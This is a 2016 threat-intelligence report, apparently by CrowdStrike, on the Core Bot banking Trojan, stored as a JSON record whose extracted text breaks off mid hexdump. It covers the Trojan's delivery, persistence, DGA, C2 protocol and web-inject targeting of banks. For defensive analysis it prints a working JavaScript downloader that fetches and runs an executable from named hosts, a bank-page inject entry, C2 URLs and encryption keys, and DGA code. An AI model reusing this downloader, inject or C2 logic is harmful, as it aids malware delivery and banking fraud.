{
    "id": "08b4a122-8008-40a0-8352-8d1609f99e5f",
    "created_at": "2022-10-25T16:48:23.24594Z",
    "updated_at": "2025-03-27T02:14:38.589894Z",
    "deleted_at": null,
    "sha1_hash": "217576919d9e161670babd24f9854426db41cfb2",
    "title": "Microsoft Word - CSIR.docx",
    "authors": "",
    "file_creation_date": "2016-08-01T23:42:10Z",
    "file_modification_date": "2016-08-01T23:42:10Z",
    "file_size": 7787550,
    "plain_text": "## EMERGENCE AND DEVELOPMENT \n OF CORE BOT\n\n! !\n\n\n-----\n\n-----\n\n### TABLE OF CONTENTS\n\n**EXECUTIVE SUMMARY ............................................................................................................. 3**\nKEY POINTS ...................................................................................................................................... 3\n\n**ATTRIBUTION .......................................................................................................................... 5**\nTARGETING ...................................................................................................................................... 5\n\nTimeline ........................................................................................................................................... 5\n\nTargets ............................................................................................................................................. 6\n\nADVERSARY ASSESSMENT ............................................................................................................... 8\n\n**TECHNICAL ANALYSIS ............................................................................................................. 10**\nDeployment ................................................................................................................................... 10\n\nInstallation ..................................................................................................................................... 11\n\nCommand and Control .................................................................................................................. 15\n\nCapability ....................................................................................................................................... 20\n\n**MITIGATION & REMEDIATION ................................................................................................ 29**\nHOST INDICATORS ......................................................................................................................... 29\n\nFiles ............................................................................................................................................... 29\n\nRegistry Values .............................................................................................................................. 30\n\nObjects .......................................................................................................................................... 30\n\nYARA Rules .................................................................................................................................... 30\n\nNETWORK INDICATORS ................................................................................................................. 32\n\nSnort Rules .................................................................................................................................... 33\n\nTACTICS, TECHNIQUES, AND PROCEDURES ................................................................................... 33\n\n**CONCLUSION .......................................................................................................................... 35**\n**APPENDIX ............................................................................................................................... 37**\n\nCopyright 2016\n\n\n1\n\n\n-----\n\n2\n\nCopyright 2016\n\n\n-----\n\n### EXECUTIVE SUMMARY\n\nAs part of research into emerging threats, CrowdStrike encountered a new commodity banking\nTrojan called Core Bot. Core Bot is a modular botnet that began as an information stealer, it was\nfirst observed in August 2015 and publicly reported on at that time.[1] Some months later, a\nmodule became available for hijacking users’ banking sessions, and configuration files were\nobserved targeting CrowdStrike customers in the financial sector. Today, Core Bot follows the\nprinciples observed with most popular banking Trojans: It uses web injects to manipulate web\nbrowser sessions in a controlled manner and implements an affiliate model for monetization of\nbotnet resources.\n\nThis report will cover the installation method of Core Bot, its Command-and-Control (C2)\nprotocol, and analysis of its two main modules: the information stealer and the Man-In-TheMiddle (MITM) banking hijacker.\n\n#### KEY POINTS\n\n  - Core Bot is a modular and extensible commodity crimeware kit that is being actively\ndeveloped since mid-2015.\n\n  - Currently observed Core Bot plugins are a stealer module for harvesting stored\ncredentials and a MITM module for intercepting online banking sessions.\n\n  - Core Bot has been primarily observed being deployed using obfuscated JavaScript files\nvia spam emails, but it has also been delivered via Angler exploit kit[2].\n\n  - The bot falls back to a Domain Generation Algorithm (DGA) if none of the primary C2\nservers can be reached.\n\n  - Adversary use of hard-coded named pipes, unique patterns for file and folder names,\nand a fixed HTTP user agent and data header in C2 communications enable detection of\nCore Bot infections.\n\n  - The group behind Core Bot is believed to be operating out of Russia or Eastern Europe.\n\n1 https://securityintelligence.com/watch-out-for-corebot-new-stealer-in-the-wild/\n2 Reference to CrowdStrike Intelligence reporting\n\nCopyright 2016\n\n\n3\n\n\n-----\n\n4\n\nCopyright 2016\n\n\n-----\n\n### ATTRIBUTION\n\n#### TARGETING\n\nCore Bot is a commodity crimeware that does not directly target organizations via its\ndistribution, but rather it opportunistically targets victims in the aim of obtaining credentials or\naccess to financial institutions for monetary gain.\n\n##### Timeline\n\nCore Bot was first publicly reported in August 2015. At that stage, it was known to be a modular\nbotnet with a plugin for harvesting credentials on the victim system. By September 2015,\nreporting[3] was released detailing a second plugin being deployed that acted as a banking\nTrojan—harvesting web form data, performing web injects into targeted banking sites, and\ndefeating two-factor authentication. Although this seems like a fairly quick progression for Core\nBot, it is likely the MITM plugin had been in development for some time.\n\n###### Campaign Links\n\nShortly after the public reporting of the MITM plugin, open source reporting[4] reported on a link\nbetween a known Core Bot C2 server and a criminal store selling stolen credentials, BTC Shop.\nBoth were registered by the email address drake.lampado777@gmail.com. The C2 server in\nquestion was vincenzo-sorelli.com with the BTC Shop domain btcshop.cc. A link\nbetween these two is not surprising since the acquired credentials from the Core Bot stealer\nwould need to be monetized.\n\nFurther analysis on this registrant email address revealed another Core Bot C2 domain\n```\npasteronixca.com. This C2 was found in two Core Bot samples not mentioned in the public\n\n```\nreporting with MD5 hashes:\n\n  - `cc09ad01ce6785d287724f2f877a91f8`\n\n  - `34f36f4ec445755d6e24203f81e562e8`\n\nIn both cases the domain gridismind.com was also included in the bots’ configuration data as\na C2. The registrant of this domain is mant@teleworm.us. This email has been used to register a\nfurther 264 domains, the majority of which are blacklisted as resolving to hosts that were\nsources of spam. Quite a few look to be related to phishing attempts against specific financial\norganizations using slightly altered domain names in an attempt to fool users by impersonating\nthe legitimate organization.\n\nIn addition to the phishing and spam hosts, the following domains were all also registered using\nthis email address:\n\n3 https://securityintelligence.com/an-overnight-sensation-corebot-returns-as-a-full-fledged-financial-malware/\n4 https://www.damballa.com/stolen-information-using-corebot-sold-on-btcshop-cc/\n\nCopyright 2016\n\n\n5\n\n\n-----\n\n  - `retsback.com`\n\n  - `updconfs.com`\n\n  - `systruster.com`\n\n  - `msupdcheck.com`\n\nOf note, these hosts were all recently reported to be related to the ATMZombie banking Trojan\ndeployed against Israeli banks[5]. This link suggests one of the following scenarios:\n\n1. Core Bot operators outsource the hosting to a well-known bulletproof hosting service\n\nknown as Avalanche or Kol that has been around for a number of years and supplies the\noperators of ATMZombie, as well as phishing and spam site operators.\n\n2. The actors behind Core Bot have diversified their operations to spam, phishing, and\n\nother malware operations to target Israeli banks.\n\n3. An affiliate using Core Bot is also involved in other operations in order to maximize\n\nrevenue.\n\nCrowdStrike assesses the first scenario to be most likely. It is common practice to rent criminal\nhosting services when running botnets, and given the development effort that has gone into\nCore Bot, it seems unlikely the group would be resourced to manage all those different types of\noperations.\n\n##### Targets\n\nCore Bot’s initial targeting was opportunistic, and little could be determined during the\ncredential-stealing phase of its operations. Once it became a banking Trojan using the MITM\nplugin, the following configuration targeting could be observed:\n\n1. September 2015: Initial targeting was mainly U.S. banks with some Canadian\n\ninstitutions.\n\n2. November 2015: in3.dat was delivered as the primary configuration file and added a\n\nnumber of Asian banks to the U.S. and Canadian institutes.\n\n3. February 2016: f2_jp.dat was delivered for the first time targeting solely Japanese\n\nbanks.\n\n###### Bot Family\n\nCore Bot’s initial configuration data contains a parameter called core.family. In the analyzed\nsamples, the values 1 and 5 have been observed for this parameter. It appears this is a\ncampaign or affiliate identifier and it is used to determine what variant of the web inject\nconfiguration file is delivered. For early samples the value was set to 1 and returned in3.dat;\nfrom February onward, samples with a value of 5 were observed delivering f2_jp.dat.\n\n5 https://securelist.com/blog/research/73866/atmzombie-banking-trojan-in-israeli-waters/\n\nCopyright 2016\n\n\n6\n\n\n-----\n\n###### Configuration File in3.dat\n\nThis is a large MITM configuration file that contains targeting for 36 URLs belonging primarily to\ninstitutions in North America and Asia. Most are in the U.S., with the others in Canada,\nSingapore, and Hong Kong. The majority are banks where both corporate and commercial users\nare targeted.\n\nThe in3.dat configuration is the most complex that was analyzed. It contains injects and twofactor authentication bypass mechanisms for most of the targets that are described in more\ndetail in the Man-In-The-Middle Plugin section of this report.\n\nThe following URLs are used for token grabbing, a process that authenticates the adversary\nwhen two-factor authentication is used and enables accounts then to be added to perform\nunauthorized transactions:\n\n  - `http://185.14.29.123:18000/tkn/api.php`\n\n  - `http://185.14.29.123:18000/tkn/assets.php`\n\nA large number of scripts for the various targets are included in this configuration file. Two\nsecond-stage script URLs controlled by the adversary were included as resources in the scripts\ninjected into banking sessions. This was done to reduce the footprint of code deployed to\nvictims that are not accessing targeted URLs, and to enable tweaking of configurations without\nthe need to deploy new configurations:\n\n  - `https://serurityaccessapp.com/safety/`\n\n  - `https://can-ips.com/ingcaadmin/`\n\n###### Configuration File f2_jp.dat\n\nIn contrast to the previous one, this is a very small and simple MITM configuration file. It\ncontains a list of only seven target URLs that are all banking institutions in Japan. It contains no\nembedded scripts, instead providing source paths for each target to download the script from\nkeeping the footprint small on machines that are not interacting with targeted institutions.\nThere is no evidence of two-factor authentication bypass mechanisms in this file. Below is an\nexample of an entry from the configuration:\n```\ntext/html\n*bk.mufg.jp/ib*/dfw/*\n<head*>\n<script type=\"text/javascript\">var me401f14bf80da13ffa8a479ac636c510 =\n\"%BOTID%\";</script>\n<script type=\"text/javascript\" src=\"https://ifreeonline.com/74f23f9e28cbc5ddaae8582f48642a59\"></script>\n\n```\nIt ensures the BOTID is sent as a variable in the script that is downloaded and embedded into\nthe HTTP response when a URL is accessed that matches *bk.mufg.jp/ib*/dfw/*.\n\nCopyright 2016\n\n\n7\n\n\n-----\n\nAs mentioned above, this configuration does not contain token grabbing URLs, but rather host’s\nscripts for the individual banks being targeted on the host:\n\n  - `https://ifree-online.com/`\n\n#### ADVERSARY ASSESSMENT\n\nWhile this report focuses on a technical description of the malware, this section will briefly\nassess the capabilities and level of sophistication of the threat actor behind the botnet. The\nadversary operating Core Bot appears to be a single group of likely Russian or Eastern European\ncriminal actors offering a small number of affiliate schemes.\n\n  - There is no evidence of Core Bot components being leaked or available in the\nunderground market either as source code or as compiled executables. This suggests it\nis a closed-source operation and is monetized as an affiliate program.\n\n  - While the C2 servers differ, artifacts such as the URL path, communications encryption\nkey, and provided configuration data remain the same.\n\n  - The same web inject configuration files are sent in response to different, seemingly\nunrelated C2 servers.\n\n  - Changing the family configuration setting determines the web injects file that is received\nregardless of the C2, suggesting a single group that can deploy different affiliated\nbotnets via any of their hosts.\n\n  - Links to other Russian and Eastern European cybercriminal campaigns including access\nto deployment mechanisms such as Angler Exploit kit, and links to web inject\nconfiguration writers, criminal-hosting providers, and other underground resources.\n\nUnlike many banking Trojans, the code in Core Bot is unique and is not based on the leaked\nsource code of other tools such as Zeus or Carberp. It is not often that brand-new banking\nTrojans with this degree of complexity written from scratch show up, demonstrating that the\ngroup behind Core Bot has access to competent developers. The use of token servers for\nbypassing two-factor authentication and the deployment of second-stage web inject servers to\nminimize attack footprint on victims demonstrate that the adversary is operating at the higher\nend of the criminal spectrum.\n\nDespite this, the group has made errors. There are coding mistakes made with the DGA\ndiscussed later in this report and the use of trivial techniques such as string comparison for\nverification of valid servers. The botnet appears still to be in an early phase of development with\na large amount of debug information included and verbose reporting back to C2 servers.\nPenetration by Core Bot is much lower than with other banking Trojans and it does not appear\nto be increasing, but the resourcefulness and ongoing development by the adversary means it\nstill poses a threat to financial institutes and individuals.\n\nCopyright 2016\n\n\n8\n\n\n-----\n\n9\n\nCopyright 2016\n\n\n-----\n\n### TECHNICAL ANALYSIS\n\n##### Deployment\n\nThe initial infection vector for most Core Bot instances has been as a second-stage payload for\nspam campaigns containing JavaScript downloaders. Some instances may also have been\ndeployed using the Angler Exploit kit analyzed in CrowdStrike Intelligence reporting.\n\n###### Delivery\n\nA subset of samples were observed being delivered using the following method:\n\n1. A spam email is sent with an attachment purporting to be a court notification or invoice.\n\nIt has a filename containing a randomly generated number and using a double extension\nrelying on the operating system hiding the second extension and fooling the user into\ndouble clicking the file. One example observed was\n```\n    Court_Notification_000475583.doc.js. These lures are identical to those sent\n\n```\nby the Asprox botnet before it disappeared in early 2015.[6]\n\n2. The payload contains an obfuscated JavaScript file that is randomized for each round of\n\nemails to ensure difficulty in detection.\n\n3. The obfuscated JavaScript is split into many randomized functions that concatenate the\n\nsecond-stage script together and execute it.\n\n4. The second-stage script downloads the final Core Bot dropper payload and executes it.\n\nBelow is a copy of a deobfuscated second-stage JavaScript:\n```\nvar\nstr=\"55515C5E1710011201072402050D1613051D09074A070B095E275E06080117170D\n0A0317160105080117100510014A0D0A5E17555E55505051505C515356565E55\";\nfunction dl(fr) {\n var b = \"dreliaz.org vidyaprakashpublicschool.org\naeonwebtechnology.com\".split(\" \");\n for (var i = 0; i < b.length; i++) {\n  var ws = WScript.CreateObject(\"WScript.Shell\");\n  var fn = ws.ExpandEnvironmentStrings(\"%TEMP%\") +\nString.fromCharCode(92) + Math.round(Math.random() * 100000000) +\n\".exe\";\n  var dn = 0;\n  var xo = WScript.CreateObject(\"MSXML2.XMLHTTP\");\n  xo.onreadystatechange = function() {\n    if (xo.readyState == 4 && xo.status == 200) {\n     var xa = WScript.CreateObject(\"ADODB.Stream\");\n    xa.open();\n    xa.type = 1;\n    xa.write(xo.ResponseBody);\n     if (xa.size > 1000) {\n     dn = 1;\n\n```\n6 https://isc.sans.edu/forums/diary/What+Happened+to+You+Asprox+Botnet/19435/\n\nCopyright 2016\n\n\n10\n\n\n-----\n\n```\n     xa.position = 0;\n     xa.saveToFile(fn, 2);\n      try {\n      ws.Run(fn, 1, 0);\n     } catch (er) {};\n    };\n    xa.close();\n   };\n  };\n  try {\n   xo.open(\"GET\", \"http://\" + b[i] + \"/counter/?id=\" + str + \"&rnd=\"\n+ fr, false);\n   xo.send();\n  } catch (er) {};\n  if (dn == 1) break;\n };\n};\ndl(9441);\ndl(4172);\ndl(6013);\n\n```\nThis method of distribution is fairly common in commodity attacks and has been observed\ndropping other malware families in addition to Core Bot.\n\nOnce invoked, the executables sole purpose is to evade detection by anti-virus and unpack the\nCore Bot loader into memory. It achieves this by heavy use of packing and obfuscation, a\ncommon technique used by commodity crimeware.\n\n###### Loader\n\nThe PDB path that is present in the binary can identify the Core Bot loader:\n```\n    C:\\work\\itco\\core\\bin\\x86\\Release\\loader.pdb\n\n```\nThe loader is simplistic; it decompresses the Core Bot payload and loads it into memory using\nthe technique outlined below that is becoming increasingly popular in commodity malware, as it\navoids writing payload executables to disk:\n\n1. The loader locates the `.data2` section that contains the compressed payload.\n\n2. The section is decompressed using aPLib[7] compression and loaded into a new memory\n\nsegment.\n\n3. The loader fixes the payloads, imports, and relocations.\n\n4. The entry point is found and execution is passed to the payload.\n\n##### Installation\n\nOn execution the Core Bot main module, a 32-bit executable, first sets up an up an Auto-Start\nExecution Point (ASEP) for persistence, and then unpacks its initial configuration data.\n\n7 http://ibsensoftware.com/products_aPLib.html\n\nCopyright 2016\n\n\n11\n\n\n-----\n\nDuring execution, it determines the CPU architecture it is running on. The module contains a 64bit compiled version of itself stored inside a .x64 section. If it determines it is running on a 64bit system, it will extract this file, execute an instance of the dllhost.exe executable (which\nships with the Windows operating system) in suspended mode, and inject the extracted 64-bit\ninstance into the code before resuming execution—a technique known as process hollowing. On\na 64-bit system, this is required to ensure processes running in 64-bit mode can be successfully\ninjected.\n\n###### Configuration\n\nThe Core Bot main executable has a .params section that contains its encrypted initial\nconfiguration data. Core Bot extracts this data by:\n\n1. Locating the .params section\n\n2. Decrypting its content using the RC4 algorithm and the hard coded key 0A A2 AA 50\n```\n    E9 4C A8 41 98 81 76 0D 12 A6 1B 54 79 26 E6 1F 77 85 06 F1 9E 6D\n    B0 42 FF F3 29 14\n\n```\n3. Parsing the decrypted configuration\n\nCode for extracting the initial configuration data from the main module is included in the\n_Appendix._\n\nThe configuration data is a binary structure and each entry has the following format:\n```\n[BYTE number of items] [BYTES items]\n\n```\nwith each item having the format:\n```\n[DWORD key size] [BYTES key] [DWORD value size] [BYTES value]\n\n```\nOnce loaded into memory, this data forms the baseline of Core Bot’s configuration. On first\nexecution Core Bot creates a further set of initial items and adds them to this configuration. It\ncan be further updated using commands from the bot’s C2 server. The table below shows the\nitems in this configuration. DGA values are omitted, as they are covered in the Domain\n_Generation Algorithm section:_\n\nCopyright 2016\n\n\n12\n\n\n-----\n\n|ITEM NAME|DESCRIPTION|\n|---|---|\n|core.safe_mode|Boolean value that, if set to 1, ensures no plugins are loaded. Likely used by the adversary if an unknown plugin is causing problems on the victim system.|\n|core.create_time|Time that Core Bot was installed on the victim system, stored in Epoch time.|\n|core.guid|A Globally Unique Identifier (GUID) used to uniquely identify each victim. The GUID is created using the Windows API CoCreateGUID().|\n|core.heartbeat|Boolean value that, if set to TRUE, ensures that other instances are signaled to exit when the primary instance terminates.|\n|core.interval|Number of seconds between C2 beacon requests.|\n|core.last_start|Time that Core Bot was last executed on the victim system, stored in Epoch time.|\n|core.no_install|Boolean value that, if set to TRUE, ensures Core Bot is not installed on the system and does not persist after an OS reboot.|\n|core.pid|Process ID of the Core Bot main module.|\n|core.plugins_folder|The name of the directory within the Core Bot working directory used to store its encrypted plugin files. The folder name is generated based on the volume serial number and formatted as a GUID using the format string %08x-%04x- %04x-%02x%02x-%02x%02x%02x%02x%02x%02x.|\n|core.run_count|The number of times Core Bot has been executed.|\n|core.server_key|The RC4 encryption key used for encrypting POST requests to and responses received from the C2 server. Only a single encryption key e3f33a48fad320f43ca6130294cfb191 has so far been observed, suggesting this is not a configurable part of the botnet or only a small group is using it.|\n|core.server_sign|Used as a simple string check when sending an initial beacon to a server. The server is accepted as valid if the decrypted response contains a matching hash. This is a weak verification relying simply on a string comparison and not a cryptographic signature check.|\n|core.starter_files|A file path pointing to the copy of the Core Bot dropper made during the installation process.|\n|core.svchost|A Boolean value that, if set to true, instructs the executable to be injected into a new instance of the legitimate Windows svchost.exe process.|\n|core.urls|A list of URLs that Core Bot should use for its C2 communications.|\n|core.work_dir|The full path to where Core Bot stores its encrypted|\n\n\n13\n\n\nCopyright 2016\n\n\n-----\n\nconfiguration file described below and also its plugin\ndirectory. The working directory name is also generated\nbased on the volume serial number and formatted as a GUID.\n`tmp.volume_sn` The victim’s system drive volume serial number, it is used to\nseed the generation of per victim unique file names, directory\nnames and encryption keys used by Core Bot.\n###### Table 1. Configuration Items Stored by Core Bot\n\nEach time a new entry is added or removed from memory, a copy of the current configuration is\nsaved to the victim’s disk in encrypted form. The file is saved to the working directory created by\nCore Bot on initialization using the path:\n```\n%LOCALAPPDATA%\\Microsoft\\<working directory>\\<configuration file>\n\n```\nThe strings <working directory> and <configuration file> are both GUIDs generated\nbased on the system drive’s volume serial number. Below is an example on a compromised\nsystem:\n```\nC:\\Users\\user\\AppData\\Local\\Microsoft\\093a68ef-65f2-b3e6-7a11e67846f8b548\\306e64db-bfc5-b522-664b-98dad0bf71be\n\n```\nThe configuration file is encrypted using RC4 and a key generated using the same algorithm that\nis implemented to produce the GUID filenames. It is also seeded with the system drive’s volume\nserial number. Although the algorithm for these functions is the same, the initial key value and\nthe value used to perform an eXclusive OR (XOR) against the volume serial number are different\nin each case and hard coded into the bot. The Python script below replicates the algorithm used\nto generate the key for the configuration file encryption:\n```\nfrom struct import unpack, pack\n#------------------------------------#Rotate DWORD right 2\ndef ror2Dword(dat):\n    r = dat >> 2\n    l = (dat << 30) & 0xffffffff\n    out = (r + l) & 0xffffffff\n    return out\n#------------------------------------seedkey =\n\"\\x64\\x30\\x67\\x43\\xD5\\x26\\x25\\xF6\\x94\\xD4\\xE2\\xD3\\x65\\x4D\\x63\\xD8\\x1B\\x\nEA\\xC3\\xA4\\xA4\\xBD\\x46\\x75\"\nxorkey = 0x42AB3122\nmodkey = volserial ^ xorkey\nrc4key = \"\"\ntemp = \"\"\noffset = 0\nwhile offset < len(seedkey):\n    temp = unpack('I',seedkey[offset:offset+4])[0]\n    rc4key += pack('I',(temp ^ modkey))\n    modkey = ror2Dword(modkey)\n    offset += 4\n\n```\nCopyright 2016\n\n|Col1|configuration file described below and also its plugin directory. The working directory name is also generated based on the volume serial number and formatted as a GUID.|\n|---|---|\n|tmp.volume_sn|The victim’s system drive volume serial number, it is used to seed the generation of per victim unique file names, directory names and encryption keys used by Core Bot.|\n\n\n14\n\n\n-----\n\n###### Persistence\n\nCore Bot will always install itself onto the victim system unless the item core.no_install is\npresent in the initial configuration. No samples were observed that included this item.\n\nCore Bot’s first step is to create its installation directory and copy itself into that directory. The\ninstallation directory, like the working directory, is created in the path\n```\n%LOCALAPPDATA%\\Microsoft\\. Both the installation directory name and file name are GUIDs\n\n```\ngenerated using the system disk volume serial number and the algorithm used to encrypt the\nconfiguration file. Both files use different seed keys and constants to ensure the GUIDs\ngenerated are different. The dropper file is copied to the new file location before deleting the\noriginal dropper.\n\nThe second step is to create the ASEP using the registry. Using the previous algorithm with a\ndifferent seed, a GUID is generated for the registry value and created in the\n```\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run key. The path is then set to\n\n```\nthe previously copied dropper file.\n\n##### Command and Control\n\nCore Bot utilizes the HTTP protocol for its C2 communications using the WinHTTP library. It\nutilizes the core.urls list from its configuration data to determine which C2 server to connect\nto, attempting each in turn until a successful connection is made. If a connection cannot be\nmade, a secondary mechanism can be initiated using a Domain Generation Algorithm (DGA).\n\n###### Domain Generation Algorithm\n\nCore Bot contains artifacts in its configuration data that enable it to generate domains based on\nan algorithm. It will attempt to connect to each of these generated domains in turn if no primary\nC2 server is available. Core Bot uses subdomains of dynamic DNS providers and full domains\nwith several Top Level Domains (TLDs); newer samples also contain a wider range of TLDs to\nincrease the number of potential domains. The way Core Bot uses its DGA is dependent on its\nconfiguration data.\n\nThe following elements of the DGA are stored in the configuration data:\n\nCopyright 2016\n\n\n15\n\n\n-----\n\n**ITEM NAME** **DESCRIPTION**\n`core.dga.group` An integer used as part of the DGA seed\nincreasing the number of potential generated\ndomains. If no group ID is specified, the\ndefault value of 1 is used.\n`core.dga.zones` DNS provider zone that the generated\nsubdomains will be appended to.\n`core.dga.key_fingerprint` A signature check to ensure valid protocol\nexchange takes place when a live generated\ndomain is found.\n`core.dga.domains_count` Number of DGA subdomains to create\n`core.dga.url_path` The URL path to use when communicating\nwith a DGA subdomain.\n###### Table 2. DGA Configuration Items Stored by Core Bot\n\nThe DGA is created based on a seed value. The initial seed value is generated based on the\ncurrent date from the date headers extracted from a request to google.com and the group\ninteger from the configuration data. They are combined to create the initial seed using the\nfollowing process:\n\n1. Take the number of the month and left shift it by 8.\n\n2. Take the output and perform a logical OR with the current day of the month.\n\n3. Add the current year.\n4. Take the output and add this to the group number left shifted by 16.\n\n5. Finally add the hard-coded seed value 0x1DB98930.\n\nThe output of this is fed into a Linear-Congruential-Generator (LCG) that is used to determine\nthe subdomain length between the values of 12 and 24. The new seed value is fed back into the\ngenerator to select a character from the array abcdefghijklmnopqrstuvwxy012345678 and\nthe process is repeated until all characters are selected. The absence of the characters z and 9 is\nnotable and is the result of an off-by-one coding error by the adversary when building the\ncharacter array.\n\nOnce a subdomain is generated, it is prepended to the zone value to create the full domain. For\nsamples analyzed in late 2015, this was .ddns.net. Since then configurations have been\nobserved that additionally contain TLDs cn, com, cc, ws, sg, and in.\n\nEach subsequent domain that is created uses the output seed value from the previous\ngeneration. This process is repeated until domains_count is reached. The code for producing\nthis DGA is included below:\n\nCopyright 2016\n\n|ITEM NAME|DESCRIPTION|\n|---|---|\n|core.dga.group|An integer used as part of the DGA seed increasing the number of potential generated domains. If no group ID is specified, the default value of 1 is used.|\n|core.dga.zones|DNS provider zone that the generated subdomains will be appended to.|\n|core.dga.key_fingerprint|A signature check to ensure valid protocol exchange takes place when a live generated domain is found.|\n|core.dga.domains_count|Number of DGA subdomains to create|\n|core.dga.url_path|The URL path to use when communicating with a DGA subdomain.|\n\n\n16\n\n\n-----\n\n```\n#Variables hard coded into the bot\nlower = 12\nhigher = 24\ncharray = \"abcdefghijklmnopqrstuvwxy012345678\"\nstartseed = 0x1DB98930\n#-------------------------------------------------#Function to create initial seed\ndef init_seed(group,year,month,day):\n    init = (day | (month << 8)) + year\n    return (init + (group << 16)) + startseed\n#-------------------------------------------------#Function to create a days worth of domains\ndef create_domains_day(group,count,zone,year,month,day):\n    domlist = []\n    dcount = 0\n    curseed = init_seed(group,year,month,day)\n    for dcount in range(count):\n       curseed = (1664525 * curseed + 1013904223) & 0xffffffff\n       val = curseed % (higher - lower)\n       lendom = lower + val\n       offset = 0\n       curdom = ''\n       for offset in range(lendom):\n           curseed = ((1664525 * curseed) + 1013904223) &\n0xffffffff\n           charselect = curseed % len(charray)\n           curdom += charray[charselect]\n       curdom += zone\n       domlist += [curdom]\n    return domlist\n\n###### Protocol\n\n```\nOnce an active C2 domain has been established, Core Bot will make beacon requests using HTTP\nPOST requests. The POST requests are always to the path specified in the configuration data; a\ndifferent path can be specified for primary C2 URLS and DGA hosts.\n\n###### Message Types\n\nCore Bot will send a number of different message types to the C2 for requesting information,\nrequesting plugins, and sending back status information. The first byte of the request payload\nwill always be a message ID. Below is a table documenting Core Bot’s message IDs and what it\nuses them for:\n\nCopyright 2016\n\n\n17\n\n\n-----\n\n|ID|DESCRIPTION|\n|---|---|\n|0x29|Main beacon request sent at regular intervals based on core.interval time in seconds. Response to this request is either nothing or a command to execute.|\n|0x2A|Send a basic success/failure status message to the C2 server in response to executing commands.|\n|0x2B|Send a detailed status message to the C2 server in response to certain commands.|\n|0x2C|Send debug information to the C2 server about actions carried out by the bot.|\n|0x2D|Send victim and bot information to the C2 server and request a session ID for used in forth coming requests.|\n|0x2E|Initial beacon and request for the server signature to verify the C2.|\n|0x30|Send information on installed plugins. When no plugins are installed the initial request is empty and used to initialize the command loop.|\n|0x31|Send detailed information on installed plugins used in conjunction with the update and remove plugin commands.|\n|0x47|Upload data to the C2 server such as screenshots.|\n|0x5A|Request a plugin by the name provided in the install plugin command.|\n|0xFF|Any message from an installed plugin that is sent to the C2 server is wrapped in an FF message.|\n\n\n###### Table 3. Message IDs in Requests\n\nCore Bot will send messages in the following sequence during execution:\n\n1. The first message of type 0x2E is an initial beacon request where the server signature\n\nhash is expected as a response and is checked to verify the server.\n\n2. Once verified, message 0x2D is sent, containing information about the victim system\n\nand the running instance of Core Bot. In response, a session ID is received that is used in\nfuture requests.\n\n3. Message 0x30 is then sent to initialize the command loop.\n\n4. Core Bot will periodically poll the C2 server with message 0x29 for requesting\n\ncommands. If a response is received, the ID is extracted and a corresponding command\nexecuted.\n\nIf an install plugin command is received, Core Bot will send a plugin request with message ID\n```\n0x5A. In response to different actions, Core Bot will send back debugging and status messages\n0x2A, 0x2B, 0x2C, and 0x30. Once plugins are installed, they too can send back messages to\n\n```\nthe C2 server; these always have the ID 0xFF.\n\n###### Request\n\nAll C2 communications use the fixed user agent string Mozilla/5.0 (compatible; MSIE\n```\n10.0; Windows NT 6.1; WOW64; Trident/6.0). An example of a Core Bot C2 request is\n\n```\nshown below:\n```\nPOST /gate/ HTTP/1.1\nCache-Control: no-cache\nConnection: Keep-Alive\n\n```\nCopyright 2016\n\n\n18\n\n\n-----\n\n```\nPragma: no-cache\nUser-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64;\nTrident/6.0)\nContent-Length: 20\nHost: pomppondy.net\nAQAAAPEH84u5ejpjLQ==\n\n```\nThe POST content is Base64 encoded and, once decoded, contains the following structure:\n```\n[DWORD Version][BYTES Encrypted data]\n\n```\nThe DWORD value is always set to 1 and is likely a version number. Since the current version is\nalways 1, the Base64-encoded data will always start with the string AQAAA. This can be\nleveraged in a signature to detect Core Bot traffic on the network. The data portion of the\nmessage is encrypted with RC4 using the core.server_key from the configuration data. In all\nsamples analyzed, this value was e3f33a48fad320f43ca6130294cfb191.\n\nThe decrypted data has the following structure:\n```\n[BYTE ID] [BYTES Data]\n\n```\nThe ID determines the type of data and what data is included; data can be sent as text in the\ncase of the victim’s system information or in a binary data format the same as the configuration\nfile in the case of status update messages.\n\n###### Response\n\nThe responses from the C2 server are not Base64 encoded, but instead, using the following\nprotocol:\n\n1. Encrypted data is split and sent using HTTP chunked encoding.\n\n2. Each segments size is stored in the response as ASCII followed by a carriage\n\nreturn/newline line break(\\x0d\\x0a).\n\n3. Each segment is extracted by taking data of the length specified from immediately after\n\na line break and up to the next one.\n\n4. The next segment’s size then follows.\n\n5. Each segment is extracted and added to the output before decryption using RC4 and the\n\nsame key as the POST requests.\n\nThe following structure represents the HTTP chunked encoding response data, where segments\nare repeated until all data is present:\n```\n[ASCII Segment Size] [BYTES 0D 0A] [BYTES Segment data] [BYTES 0D 0A]\n\n```\nBelow is an example of this data structure with colors used to highlight the specific sections:\n\nCopyright 2016\n\n\n19\n\n\n-----\n\n```\n0000000: 4854 5450 2f31 2e31 2032 3030 204f 4b0d HTTP/1.1 200 OK.\n0000010: 0a53 6572 7665 723a 206e 6769 6e78 2f31 .Server: nginx/1\n0000020: 2e39 2e34 0d0a 4461 7465 3a20 5468 752c .9.4..Date: Thu,\n0000030: 2032 3220 4f63 7420 3230 3135 2031 363a  22 Oct 2015 16:\n0000040: 3332 3a30 3520 474d 540d 0a43 6f6e 7465 32:05 GMT..Conte\n0000050: 6e74 2d54 7970 653a 2074 6578 742f 6874 nt-Type: text/ht\n0000060: 6d6c 3b20 6368 6172 7365 743d 7574 662d ml; charset=utf0000070: 380d 0a54 7261 6e73 6665 722d 456e 636f 8..Transfer-Enco\n0000080: 6469 6e67 3a20 6368 756e 6b65 640d 0a43 ding: chunked..C\n0000090: 6f6e 6e65 6374 696f 6e3a 2063 6c6f 7365 onnection: close\n00000a0: 0d0a 5661 7279 3a20 4163 6365 7074 2d45 ..Vary: Accept-E\n00000b0: 6e63 6f64 696e 670d 0a58 2d50 6f77 6572 ncoding..X-Power\n00000c0: 6564 2d42 793a 2050 4850 2f35 2e35 2e39 ed-By: PHP/5.5.9\n00000d0: 2d31 7562 756e 7475 342e 3133 0d0a 5365 -1ubuntu4.13..Se\n00000e0: 742d 436f 6f6b 6965 3a20 5048 5053 4553 t-Cookie: PHPSES\n00000f0: 5349 443d 6837 3767 6736 7665 356c 6e71 SID=h77gg6ve5lnq\n0000100: 6170 396c 656a 656c 6f30 7370 6231 3b20 ap9lejelo0spb1; \n0000110: 7061 7468 3d2f 0d0a 4578 7069 7265 733a path=/..Expires:\n0000120: 2054 6875 2c20 3139 204e 6f76 2031 3938  Thu, 19 Nov 198\n0000130: 3120 3038 3a35 323a 3030 2047 